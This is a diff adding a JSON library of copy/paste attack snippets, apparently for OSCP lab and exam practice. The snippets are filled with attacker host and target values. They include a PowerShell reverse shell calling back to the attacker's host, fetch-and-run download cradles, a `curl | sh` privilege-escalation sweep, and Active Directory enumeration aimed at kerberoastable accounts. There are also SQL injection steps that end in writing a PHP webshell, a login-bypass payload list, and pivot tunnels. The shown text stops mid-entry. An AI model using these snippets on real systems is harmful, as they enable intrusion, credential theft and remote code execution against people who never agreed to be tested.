@@ -1,0 +1,449 @@
+{
+  "_note": "Copy/paste manual-exploitation snippet library (ROADMAP §11). Project-authored obol-local data. Fact kinds are normalized to obol-local's namespace (AGENTS.md); {{tokens}} are filled from facts by obol/scripts.py (basedn/target/user/password/domain from command_context, lhost/lport from staging/listeners). examSafe = OSCP-rule-safe (manual, no automated exploitation). Nothing here is auto-executed — every snippet is human-run.",
+  "scripts": [
+    {
+      "id": "ldapsearch",
+      "cat": "AD Enum — no PowerView, no upload",
+      "name": "LDAPSearch (.NET DirectoryServices helper)",
+      "lang": "powershell",
+      "desc": "Queries Active Directory through pure .NET DirectoryServices — nothing to upload, no PowerView, and it runs from any domain-joined shell.",
+      "when": "You hold any Windows foothold (RDP, WinRM, reverse shell) on a domain-joined host and want AD answers without dropping tooling that AV already fingerprints.",
+      "where": "Run on the TARGET (domain-joined Windows) in any PowerShell session. Paste the function first, then the cookbook queries.",
+      "how": "Paste the whole function into your session, then call: LDAPSearch -LDAPQuery \"(filter)\". Results come back as DirectoryEntry objects — pipe to ForEach-Object { $_.Properties } to read attributes.",
+      "code": "function LDAPSearch {\n    param([string]$LDAPQuery)\n    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n    $rootDN = ([adsi]\"LDAP://$dc\").distinguishedName\n    $root = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$dc/$rootDN\")\n    $finder = New-Object System.DirectoryServices.DirectorySearcher($root)\n    $finder.PageSize = 1000          # page results so you are not capped at the first 1000\n    $finder.Filter = $LDAPQuery\n    $finder.FindAll()\n}",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [
+        "bloodhound-python",
+        "netexec"
+      ],
+      "examSafeReason": "Pure .NET DirectoryServices querying — no collector uploaded and no automated exploitation, so it stands in for BloodHound/NetExec collection under exam rules.",
+      "pathProposable": true,
+      "lane": "ad",
+      "prereq": {
+        "any": [
+          "foothold.windows",
+          "ad.domain_known"
+        ]
+      },
+      "produces": [
+        "ad.user_list",
+        "ad.base_dn"
+      ],
+      "evidence": {
+        "card": "ad-psdotnet-enum",
+        "facts": [
+          "ad.user_list",
+          "ad.base_dn"
+        ],
+        "expects": [
+          "Directory entries (distinguishedName / sAMAccountName / CN= user objects) confirm the enumeration returned data.",
+          "A DC=…,DC=… distinguished name reveals the domain base DN.",
+          "An error (server not operational, invalid credentials, access denied) records nothing."
+        ]
+      }
+    },
+    {
+      "id": "ldap-cookbook",
+      "cat": "AD Enum — no PowerView, no upload",
+      "name": "LDAPSearch query cookbook",
+      "lang": "powershell",
+      "desc": "Runs after the LDAPSearch function. Each line answers a question BloodHound would otherwise map — group membership, roastable accounts, nested membership.",
+      "when": "Once the LDAPSearch function is loaded. Reach for these instead of a BloodHound collector whenever you cannot (or choose not to) run one.",
+      "where": "The same session where you pasted LDAPSearch.",
+      "how": "Swap the DN placeholders for real values from earlier queries. Grab the domain DN first with ([adsi]'').distinguishedName, then build DNs like CN=Some User,CN=Users,<that DN>.",
+      "code": "# Enumerate every user object:\nLDAPSearch -LDAPQuery \"(samAccountType=805306368)\"\n# Enumerate group objects:\nLDAPSearch -LDAPQuery \"(objectclass=group)\"\n# Direct members of one group (swap in the group's real DN):\nLDAPSearch -LDAPQuery \"(memberOf=CN=<GROUP NAME>,CN=Users,{{basedn}})\"\n# A user's full group chain, nested included (OID 1.2.840.113556.1.4.1941 walks the tree):\nLDAPSearch -LDAPQuery \"(member:1.2.840.113556.1.4.1941:=CN=<USER NAME>,CN=Users,{{basedn}})\"\n# Accounts with an SPN and not disabled (kerberoast set):\nLDAPSearch -LDAPQuery \"(&(samAccountType=805306368)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\"\n# Accounts flagged DONT_REQ_PREAUTH / 4194304 (AS-REP roast set):\nLDAPSearch -LDAPQuery \"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\"\n# Dump each account's description field — credentials are often parked there:\nLDAPSearch -LDAPQuery \"(samAccountType=805306368)\" | ForEach-Object { \"{0} :: {1}\" -f $_.Properties['samaccountname'], $_.Properties['description'] }",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [
+        "bloodhound-python"
+      ],
+      "examSafeReason": "Hand-run LDAP queries answer the questions BloodHound would graph without running a collector.",
+      "pathProposable": true,
+      "lane": "ad",
+      "prereq": {
+        "any": [
+          "foothold.windows",
+          "ad.domain_known"
+        ]
+      },
+      "produces": [
+        "ad.user_list",
+        "ad.base_dn"
+      ],
+      "evidence": {
+        "card": "ad-psdotnet-enum",
+        "facts": [
+          "ad.user_list",
+          "ad.base_dn"
+        ],
+        "expects": [
+          "sAMAccountName / description rows returned by the cookbook queries confirm enumeration.",
+          "A DC=…,DC=… distinguished name reveals the domain base DN.",
+          "An empty or errored query records nothing."
+        ]
+      }
+    },
+    {
+      "id": "pv-cookbook",
+      "cat": "AD Enum — no PowerView, no upload",
+      "name": "PowerView quick hits (when you CAN upload)",
+      "lang": "powershell",
+      "desc": "The PowerView one-liners that stand in for whole BloodHound edges.",
+      "when": "You hold a Windows foothold with PowerView.ps1 staged (see the download cradles). Quicker than LDAPSearch for ACL questions.",
+      "where": "A target PowerShell session, after IEX-loading PowerView.",
+      "how": "First IEX-load it: IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/PowerView.ps1'), then fire the queries below.",
+      "code": "# Where does your token already have local admin (highest-value single query):\nFind-LocalAdminAccess\n# Who is logged on to a reachable host (pick targets for credential theft):\nGet-NetSession -ComputerName {{target}}\n# Interesting rights your principal holds over other objects:\nGet-ObjectAcl -Identity {{user}} -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|ForceChangePassword' }\n# SPN-bearing accounts (kerberoast candidates):\nGet-NetUser -SPN | Select-Object samaccountname, serviceprincipalname\n# Pre-auth-not-required accounts (AS-REP candidates):\nGet-NetUser -PreauthNotRequired | Select-Object samaccountname",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [
+        "bloodhound-python"
+      ],
+      "examSafeReason": "PowerView is manual AD enumeration (permitted), not automated exploitation; it replaces BloodHound edges query by query."
+    },
+    {
+      "id": "ps-rev",
+      "cat": "Shells",
+      "name": "PowerShell reverse shell (compact one-liner)",
+      "lang": "powershell",
+      "desc": "A minimal TCP reverse shell that needs no external script download.",
+      "when": "You already have command execution on Windows (webshell, SQLi→cmd, xp_cmdshell) and want a full interactive session back.",
+      "where": "Paste/run ON the target. Start the catcher on Kali FIRST: nc -lvnp {{lport}} — always bring the listener up before firing the shell.",
+      "how": "The sidebar fills {{lhost}}/{{lport}}. If a raw paste breaks, wrap it with the UTF-16LE base64 helper below.",
+      "code": "$cli=New-Object Net.Sockets.TcpClient('{{lhost}}',{{lport}});$st=$cli.GetStream();$buf=New-Object byte[] 65536;while(($n=$st.Read($buf,0,$buf.Length)) -gt 0){$cmd=[Text.Encoding]::ASCII.GetString($buf,0,$n);$out=try{Invoke-Expression $cmd 2>&1|Out-String}catch{\"$_\"};$out+=\"PS $((Get-Location).Path)> \";$resp=[Text.Encoding]::ASCII.GetBytes($out);$st.Write($resp,0,$resp.Length);$st.Flush()};$cli.Close()",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "A hand-built TCP reverse shell — no framework payload or automated handler."
+    },
+    {
+      "id": "cradles",
+      "cat": "Shells",
+      "name": "Download cradles (get tools onto target)",
+      "lang": "powershell",
+      "desc": "In-memory when AV watches the disk; on-disk when the file must survive. certutil is the LOLBIN fallback.",
+      "when": "You have execution on Windows and need to deliver a tool (PowerView, winPEAS, nc.exe, SharpHound).",
+      "where": "Run on the TARGET. Your Kali box must already be serving the file (see the last line).",
+      "how": "In-memory means no disk write and it dies with the session; on-disk survives but AV may eat it — C:\\Users\\Public is usually writable.",
+      "code": "# Fileless fetch-and-run (best for PowerView and other .ps1 tooling):\n(New-Object Net.WebClient).DownloadString('http://{{lhost}}/PowerView.ps1') | Invoke-Expression\n# Save to disk, then execute:\nInvoke-WebRequest http://{{lhost}}/winPEASany.exe -OutFile C:\\Users\\Public\\w.exe\n# When the cmdlets are blocked, fall back to a signed LOLBIN:\ncertutil -urlcache -split -f http://{{lhost}}/w.exe C:\\Users\\Public\\w.exe\n# Serve the files from your box first: python3 -m http.server 80  (SMB: impacket-smbserver share . -smb2support)",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Built-in download cradles and the certutil LOLBIN — nothing automated, nothing framework-generated."
+    },
+    {
+      "id": "tty",
+      "cat": "Shells",
+      "name": "TTY upgrade (make a dumb shell interactive)",
+      "lang": "bash",
+      "desc": "Arrows, tab-completion, Ctrl+C, su — the first thing to do the moment you land any Linux shell.",
+      "when": "Right after catching a Linux reverse/bind shell, before you do anything else.",
+      "where": "The first line goes in the DUMB SHELL on the target; the stty line goes in YOUR Kali terminal after backgrounding.",
+      "how": "python3 line → Ctrl+Z → stty raw -echo; fg → (blind) export TERM=xterm + Enter. If python3 is missing, try python, script -qc /bin/bash /dev/null, or socat.",
+      "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# background it with Ctrl+Z, then on your own terminal hand the tty raw:\nstty raw -echo; fg\n# once the shell is back: export TERM=xterm   (reset -w if the size is wrong)\n# no python? try:  script -qc /bin/bash /dev/null",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Interpreter built-ins only; a manual shell upgrade with no tooling."
+    },
+    {
+      "id": "proof-snap",
+      "cat": "Shells",
+      "name": "OSCP proof snapshot (the exact OffSec frame)",
+      "lang": "bash",
+      "desc": "A single screenshot capturing the proof-file contents AND the target IP together in one frame.",
+      "when": "The instant you read a local.txt or proof.txt on an exam/lab box, ahead of anything else.",
+      "where": "From your shell ON the target.",
+      "how": "Screenshot the whole terminal showing every line. Paste the flag into the exam control panel too. Miss this and the box scores zero.",
+      "code": "# Windows — flag plus identity/interface in one shot:\ntype C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig /all\n# Linux equivalent:\ncat /root/proof.txt; ip addr\n# When it is the low-priv local flag instead:\ntype C:\\Users\\*\\Desktop\\local.txt & ipconfig\ncat /home/*/local.txt; ip addr",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Native commands to capture the proof frame; nothing to install."
+    },
+    {
+      "id": "ligolo-quick",
+      "cat": "Pivoting",
+      "name": "ligolo-ng quick setup (route-backed pivot)",
+      "lang": "bash",
+      "desc": "A modern pivot: a real tun interface, so nmap/smbclient/everything routes through the compromised host.",
+      "when": "You have a shell on a dual-homed host and need to reach the internal subnet with arbitrary tools, not just SOCKS-aware ones.",
+      "where": "Proxy and server side live on KALI; the agent runs on the TARGET.",
+      "how": "Create the tun interface once, run proxy on Kali and agent on target, then `session` → `start` in the proxy console, add the route, and your tools just work on internal IPs.",
+      "code": "# On your box, one-time per session — stand up the tun interface:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n# On the target after uploading the agent binary:\n./agent -connect {{lhost}}:11601 -ignore-cert\n# In the proxy console — attach and go:\nsession            # select the connected agent\nstart\n# Back on your box (new terminal) — add a route to the subnet you saw on the target:\nsudo ip route add 10.10.10.0/24 dev ligolo",
+      "execMode": "pivot",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Manual tunnelling the operator drives step by step — permitted pivoting, no automated exploitation."
+    },
+    {
+      "id": "chisel-quick",
+      "cat": "Pivoting",
+      "name": "chisel quick setup (SOCKS + port forwards)",
+      "lang": "bash",
+      "desc": "A single-binary HTTP tunnel — reverse SOCKS when you cannot bind, forward when you can.",
+      "when": "ligolo is overkill or blocked and you need SOCKS5 through the target, or to expose one internal port.",
+      "where": "The server runs on KALI and the client on the TARGET. Stage the matching-arch chisel binary first.",
+      "how": "Reverse SOCKS = target dials out to you and your tools use socks5://127.0.0.1:1080 via proxychains. Add \"socks5 127.0.0.1 1080\" to /etc/proxychains4.conf.",
+      "code": "# On your box — reverse listener:\n./chisel server -p 9000 --reverse\n# On the target — reverse SOCKS proxy (pivot into the internal network):\n./chisel client {{lhost}}:9000 R:socks\n# On the target — forward a single internal service to a local port (e.g. 10.10.10.20:80):\n./chisel client {{lhost}}:9000 R:8080:10.10.10.20:80\n# Drive it:  proxychains nxc smb 10.10.10.20 ...   or open http://127.0.0.1:8080",
+      "execMode": "pivot",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Manual SOCKS/port-forward tunnelling the operator drives; permitted pivoting."
+    },
+    {
+      "id": "pscred",
+      "cat": "Utility",
+      "name": "PSCredential helper — run as another user",
+      "lang": "powershell",
+      "desc": "Builds a credential object and runs commands remotely as that user (the writedacl-dcsync card uses this for Add-ObjectACL).",
+      "when": "You recovered a cleartext password for another account and want to operate as them from your current Windows session.",
+      "where": "From your current PowerShell session on a domain-joined host.",
+      "how": "The sidebar supplies {{user}}/{{password}}/{{domain}}. The one-liner form also runs from cmd.exe (handy for webshells).",
+      "code": "$sec = ConvertTo-SecureString '{{password}}' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}', $sec)\nInvoke-Command -ComputerName {{target}} -Credential $cred -ScriptBlock { hostname; whoami }\n# Collapsed to one line (usable straight from cmd.exe or a webshell):\npowershell -Command \"$s=ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $c=New-Object System.Management.Automation.PSCredential('{{domain}}\\{{user}}',$s); Invoke-Command -ComputerName {{target}} -Credential $c -ScriptBlock { hostname; whoami }\"",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Native PowerShell credential object — no tooling, no automated exploitation."
+    },
+    {
+      "id": "b64",
+      "cat": "Utility",
+      "name": "Base64 for powershell -e (must be UTF-16LE)",
+      "lang": "bash",
+      "desc": "powershell -e decodes UTF-16LE base64 only; a plain base64 blob just fails silently.",
+      "when": "A payload with quotes or special characters keeps breaking when pasted (webshells, xp_cmdshell).",
+      "where": "Do the encoding on KALI, then paste the result on the TARGET.",
+      "how": "Save your script as rev.ps1, run the encoder, then paste the blob after -e. -nop -w hidden keeps it quiet.",
+      "code": "# Encode a PowerShell script the way -EncodedCommand expects it (UTF-16LE then base64):\niconv -t UTF-16LE rev.ps1 | base64 -w 0\n# then paste the blob on the target:\npowershell -nop -w hidden -e <blob>",
+      "execMode": "kali",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Local encoding helper on Kali; touches no target."
+    },
+    {
+      "id": "portscan-ps",
+      "cat": "Utility",
+      "name": "PowerShell port sweep (no nmap on target)",
+      "lang": "powershell",
+      "desc": "For a Windows box with no tooling that needs to probe a host.",
+      "when": "Pivot recon: you landed on a Windows host and need to map what it can reach internally.",
+      "where": "On the target, in any PowerShell session.",
+      "how": "Adjust the 1..1024 range and {{target}}. Slow but zero-upload. For a subnet sweep, wrap it in an outer loop over the last octet.",
+      "code": "foreach ($port in 1..1024) {\n    if (Test-NetConnection -ComputerName {{target}} -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue) {\n        Write-Output \"$port open\"\n    }\n}",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [
+        "nmap"
+      ],
+      "examSafeReason": "Native Test-NetConnection sweep — no scanner uploaded to the target.",
+      "pathProposable": true,
+      "lane": "recon",
+      "prereq": {
+        "any": [
+          "foothold.windows"
+        ]
+      },
+      "produces": [
+        "network.subnet_candidate"
+      ],
+      "evidence": {
+        "card": "windows-enum",
+        "facts": [
+          "network.subnet_candidate"
+        ],
+        "expects": [
+          "Only \"<port> open\" result lines record an internal-reach observation.",
+          "A run with no open-port lines records nothing."
+        ]
+      }
+    },
+    {
+      "id": "hashverify",
+      "cat": "Utility",
+      "name": "Verify uploads (corrupted transfers waste hours)",
+      "lang": "powershell",
+      "desc": "Hash the file on both ends after any transfer and compare.",
+      "when": "A tool crashes instantly or behaves oddly after upload — suspect a truncated transfer before anything else.",
+      "where": "First line on the TARGET, second on KALI, then compare the outputs.",
+      "how": "MD5 is fine for integrity (not security). If they differ, re-upload with a different method (smbserver instead of http, or a base64 paste).",
+      "code": "Get-FileHash C:\\Users\\Public\\w.exe -Algorithm MD5 | Select-Object -ExpandProperty Hash\n# compare against your box:  md5sum w.exe",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Built-in hashing to verify a transfer; nothing installed."
+    },
+    {
+      "id": "win-pe-quick",
+      "cat": "Privesc",
+      "name": "Windows privesc quick loop (before/while winPEAS runs)",
+      "lang": "powershell",
+      "desc": "A fast manual pass — privileges, patches, saved creds, password-history files.",
+      "when": "On every Windows foothold, right away — 60 seconds of work that turns up a third of privescs.",
+      "where": "On the target.",
+      "how": "whoami /priv — SeImpersonate points to the potato family; the history file leaks typed passwords; cmdkey — saved creds feed runas /savecred; systeminfo — an old OS opens kernel exploits via wesng.",
+      "code": "whoami /priv\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nGet-Content (Get-PSReadlineOption).HistorySavePath   # console history often holds secrets\ncmdkey /list                                         # saved credentials\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr InstallLocation",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Native Windows commands for a manual privesc pass; no automated exploitation."
+    },
+    {
+      "id": "lin-pe-quick",
+      "cat": "Privesc",
+      "name": "Linux privesc quick loop (before/while linpeas runs)",
+      "lang": "bash",
+      "desc": "A 60-second manual pass: sudo rights, SUID binaries, capabilities, cron, writable configs.",
+      "when": "On every Linux foothold, right away — the same discipline as the Windows loop.",
+      "where": "Straight on the target.",
+      "how": "sudo -l — anything listed maps to GTFOBins; the SUID find cross-checks against GTFOBins; getcap — cap_setuid/python is instant root; crontab — a root-run script you can write is root.",
+      "code": "sudo -l                                   # sudo rights (GTFOBins fodder)\nfind / -perm -4000 -type f 2>/dev/null    # SUID binaries\ngetcap -r / 2>/dev/null                   # file capabilities\ncat /etc/crontab; ls -la /etc/cron.*      # scheduled jobs\nfind / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|home/'\"$(whoami)\"')' | head -30",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Native Linux commands for a manual privesc pass; no automated exploitation."
+    },
+    {
+      "id": "peas-fetch",
+      "cat": "Privesc",
+      "name": "Fetch and run linpeas/winPEAS",
+      "lang": "bash",
+      "desc": "The automated sweep to run after the manual loop. Expect huge output — grep for the red flags.",
+      "when": "Once the quick loop is done, on any foothold where you can move files across.",
+      "where": "Serve from KALI with python3 -m http.server 80; download and run on the TARGET.",
+      "how": "Kali ships them at /usr/share/peas/linpeas/linpeas.sh and winpeas. Read the red/yellow highlights first — 95% of findings are there.",
+      "code": "# Serve the scripts from your box:  cd /usr/share/peas && python3 -m http.server 80\n# Linux target — stream linpeas straight into a shell:\ncurl -s http://{{lhost}}/linpeas/linpeas.sh | sh\n# Windows target — pull winPEAS, then run C:\\Users\\Public\\w.exe:\nInvoke-WebRequest http://{{lhost}}/winpeas/winPEASany.exe -OutFile C:\\Users\\Public\\w.exe",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "PEAS is an enumeration script the operator reads (permitted); it runs no exploits."
+    },
+    {
+      "id": "oscp-submit",
+      "cat": "Process",
+      "name": "OSCP submission packaging (exact OffSec format)",
+      "lang": "bash",
+      "desc": "Builds the precise archive the upload portal expects — a wrong filename or format means an unscored report.",
+      "when": "Once the report PDF is final, before the 24-hour upload window closes.",
+      "where": "Run on KALI in the folder holding your PDF.",
+      "how": "Swap OS-XXXXX for your OSID (case-sensitive), leave the 7z unencrypted, and check the MD5 the portal shows against your local md5sum.",
+      "code": "# The report is a PDF and the filename must match exactly (replace the OSID):\nmv report.pdf OSCP-OS-XXXXX-Exam-Report.pdf\n# Wrap it in an un-encrypted archive, kept under the size limit:\n7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf\n# Checksum it and confirm the value matches the one shown after upload:\nmd5sum OSCP-OS-XXXXX-Exam-Report.7z",
+      "execMode": "kali",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Local report packaging on Kali; touches no target."
+    },
+    {
+      "id": "manual-sqli",
+      "cat": "Web — exam-safe (sqlmap substitute)",
+      "name": "Manual SQLi — detect, navigate the DB, extract, RCE (no sqlmap)",
+      "lang": "bash",
+      "desc": "Hand-driven SQLi against a reflected query parameter (e.g. page.php?id=1): detect the flaw, fingerprint the engine, walk the database (databases → tables → columns → rows), extract creds, and — only where privileges allow — escalate to RCE. Pick your DB engine in the builder to get the right dialect. The exam-safe path when sqlmap is off-limits.",
+      "when": "A URL/query parameter reflects into a SQL query and the rules forbid sqlmap. Attacking a login FORM instead? Use the \"SQLi login / auth bypass\" checklist below — this one is for enumerating and looting a database through an injectable parameter.",
+      "where": "From KALI against the web target (curl, or replayed in Burp). Nothing touches the target until the RCE stage, which you trigger by hand.",
+      "how": "Set the engine, endpoint path, and parameter in the builder, then toggle the stages you need. Work top to bottom: confirm the injection (a quote that breaks the page, or a true-vs-false page difference), get the column count with ORDER BY, then UNION to fingerprint and walk information_schema. Extract, then attempt RCE only where the engine and privileges allow. Capture the request and response for every finding.",
+      "code": "# Payloads below assume MySQL/MariaDB — pick a different engine in the builder for MSSQL/PostgreSQL.\n# --- STEP 0 - Is it injectable? (break the quote, then confirm true vs false) ---\ncurl -s \"http://{{target}}/page.php?id=1'\"                 # error / 500 / altered page => worth pursuing\ncurl -s \"http://{{target}}/page.php?id=1 AND 1=1 -- -\"     # true  => page looks normal\ncurl -s \"http://{{target}}/page.php?id=1 AND 1=2 -- -\"     # false => page changes or empties\n\n# --- STEP 1 - Count the columns (increment ORDER BY until it errors) ---\ncurl -s \"http://{{target}}/page.php?id=1 ORDER BY 1 -- -\"  # raise 2,3,...; last value that works is the count\n\n# --- STEP 2 - Land a UNION and fingerprint (N = column count) ---\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,2,3 -- -\"                 # note which columns render\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,@@version,database() -- -\" # server version + active DB\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,current_user(),3 -- -\"     # who the query runs as\n\n# --- STEP 3 - Walk the structure (schemas -> tables -> columns) ---\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata -- -\"\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -\"\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -\"\n\n# --- STEP 4 - Pull the rows you care about ---\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -\"\n\n# --- STEP 5 - UNION not available? error / blind fallbacks ---\ncurl -s \"http://{{target}}/page.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -\"        # error-based: value leaks in the error text\ncurl -s \"http://{{target}}/page.php?id=1 AND substring((SELECT database()),1,1)='a' -- -\"                 # boolean-blind: one character at a time\ncurl -s \"http://{{target}}/page.php?id=1 AND IF(substring((SELECT database()),1,1)='a',sleep(3),0) -- -\"  # time-blind: a 3s delay means true\n\n# --- STEP 6 - Code exec (only with FILE priv + a known webroot) ---\ncurl -s \"http://{{target}}/page.php?id=-1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php' -- -\"  # write a webshell\ncurl -s \"http://{{target}}/s.php?0=id\"                     # execute through it\n\n# Capture per step: the exact request, the true/false difference, the rows returned,\n# and for code-exec the command output echoed back.",
+      "execMode": "kali",
+      "examSafe": true,
+      "substitutesFor": [
+        "sqlmap"
+      ],
+      "examSafeReason": "Every request is issued by hand (curl / browser / Burp), so it performs no automated exploitation — the OSCP-permitted alternative to sqlmap.",
+      "pathProposable": true,
+      "lane": "web",
+      "prereq": {
+        "any": [
+          "web.sqli_confirmed",
+          "web.parameterized"
+        ]
+      },
+      "produces": [
+        "web.sqli_confirmed",
+        "db.creds",
+        "access.shell"
+      ],
+      "evidence": {
+        "card": "sqli-union",
+        "facts": [
+          "web.sqli_confirmed",
+          "db.creds",
+          "access.shell"
+        ],
+        "expects": [
+          "A true-vs-false page difference or a SQL error (syntax / extractvalue / conversion) confirms the injection is live — not just that a request was sent.",
+          "group_concat rows in the form user:hash (or an information_schema dump with real data) confirm credential extraction.",
+          "A command result echoed in the response from the written webshell (uid=…, a whoami line, hostname) confirms RCE — the INTO OUTFILE / xp_cmdshell request alone does not."
+        ]
+      }
+    },
+    {
+      "id": "sqli-login",
+      "cat": "Web — exam-safe (login auth bypass)",
+      "name": "SQLi login / auth bypass checklist (fuzz a login form)",
+      "lang": "bash",
+      "desc": "A ready-to-fuzz set of authentication-bypass payloads for a username/password login form — get in without valid credentials wherever the login query is not parameterized. The everyday \"there is a login page\" case, laid out as a checklist you paste through the browser, Burp, or curl.",
+      "when": "A web app presents a username/password login and you suspect the fields drop straight into a SQL query (a single quote in the username throws an error or a 500, or it is a lab/exam web box). Going after a reflected URL parameter instead? Use the \"Manual SQLi\" tool above.",
+      "where": "From KALI — type payloads into the form in the browser, replay the login POST through Burp Repeater/Intruder, or fire it with curl. Nothing executes on the target; you are only submitting form values.",
+      "how": "Drop a payload in the USERNAME field, put anything in the password, and submit. Success shows up as a redirect to a dashboard, a Set-Cookie session, an authenticated page, or a response length clearly off the \"invalid credentials\" baseline. If one comment style does nothing, move to the next (-- - then # then /* */). Burp Intruder can spray the whole list at once so you can sort by status/length.",
+      "code": "# Drop a payload in the USERNAME field (any password). A win looks like a redirect, a\n# Set-Cookie session, an authenticated page, or a body length that differs from the\n# \"invalid credentials\" baseline.\n\n# --- Authenticate as the FIRST row (commonly admin) ---\nadmin' -- -\nadmin' #\nadministrator' -- -\n' OR 1=1 -- -\n' OR 1=1 LIMIT 1 -- -\n\n# --- Force a true condition (when no real username is matched) ---\n' OR '1'='1' -- -\n' OR '1'='1\n\" OR \"1\"=\"1\" -- -\n') OR ('1'='1' -- -\nadmin') -- -\n\n# --- Reproduce the login POST with curl (fix the field names + path) ---\ncurl -s -i -X POST \"http://{{target}}/login.php\" \\\n  --data-urlencode \"username=admin' -- -\" \\\n  --data-urlencode \"password=x\"\n\n# --- Fuzz the whole list in Burp Intruder ---\n# Send the login request to Intruder, mark only the username value as the payload slot,\n# load these as a Simple list, and sort the results by status / length to find the hit.\n\n# Likely not injectable if every payload yields the same \"invalid credentials\" length -\n# switch to the password field, a different comment marker, or a parameter-based SQLi.",
+      "execMode": "kali",
+      "examSafe": true,
+      "substitutesFor": [],
+      "examSafeReason": "Payloads are submitted by hand through the browser, Burp, or curl — manual testing with no automated exploitation tool."
+    },
+    {
+      "id": "portsweep-bash",
+      "cat": "Enumeration — exam-safe (nmap substitute)",
+      "name": "Bash /dev/tcp port + host sweep (no nmap on target)",
+      "lang": "bash",
+      "desc": "A pure-bash TCP connect scan using the /dev/tcp builtin — probe internal hosts/ports from a Linux foothold with nothing to upload.",
+      "when": "You are on a Linux host with no nmap/nc and need to map what it can reach internally (pivot recon).",
+      "where": "On the target, in bash. Nothing is written to disk.",
+      "how": "Tune the host and port list. Because /dev/tcp is a bash builtin, it works even when no scanner is present. For a subnet, loop the last octet as in the third line.",
+      "code": "# One host, the usual suspects:\nt={{target}}; for p in 21 22 23 25 53 80 110 139 143 443 445 3306 3389 5985 8080; do timeout 1 bash -c \"echo >/dev/tcp/$t/$p\" 2>/dev/null && echo \"$t:$p open\"; done\n# One host, full low range (slower):\nt={{target}}; for p in $(seq 1 1024); do timeout 1 bash -c \"echo >/dev/tcp/$t/$p\" 2>/dev/null && echo \"$p open\"; done\n# Sweep a /24 for one open port (discover live internal hosts):\nfor i in $(seq 1 254); do timeout 1 bash -c \"echo >/dev/tcp/10.10.10.$i/445\" 2>/dev/null && echo \"10.10.10.$i 445 open\"; done",
+      "execMode": "target",
+      "examSafe": true,
+      "substitutesFor": [
+        "nmap"
+      ],
+      "examSafeReason": "Uses only the bash /dev/tcp builtin — no scanner uploaded or installed, and no automated exploitation.",
+      "pathProposable": true,
+      "lane": "recon",
+      "prereq": {
+        "any": [
+          "foothold.linux",
+          "pivot.candidate",
+          "pivot.candidate"
+        ]
+      },
+      "produces": [
+        "network.subnet_candidate"
+      ],
+      "evidence": {
+        "card": "linux-enum",
+        "facts": [
+          "network.subnet_candidate"
+        ],
+        "expects": [
+          "Only lines that report an open service (host:port open / \"<port> open\") record an internal-reach observation.",
+          "An empty run, or connection-refused/unreachable output, records nothing — a completed sweep is not a discovery."
+        ]
+      }
+    },
+    {
+      "id": "transfer-lolbin",
+      "cat": "Shells — exam-safe file transfer",
+      "name": "LOLBIN file transfer (curl / wget / built-ins)",
+      "lang": "bash",
+      "desc": "Move a tool onto the target using only what is already installed — curl, wget, bash /dev/tcp, PowerShell, or certutil — with no dedicated transfer tool.",
+      "when": "You have execution but need to pull down a binary/script without uploading a transfer tool that AV already flags.",
+      "where": "Serve from KALI (first line) and pull on the TARGET (the rest). Use whichever client's interpreter is present.",
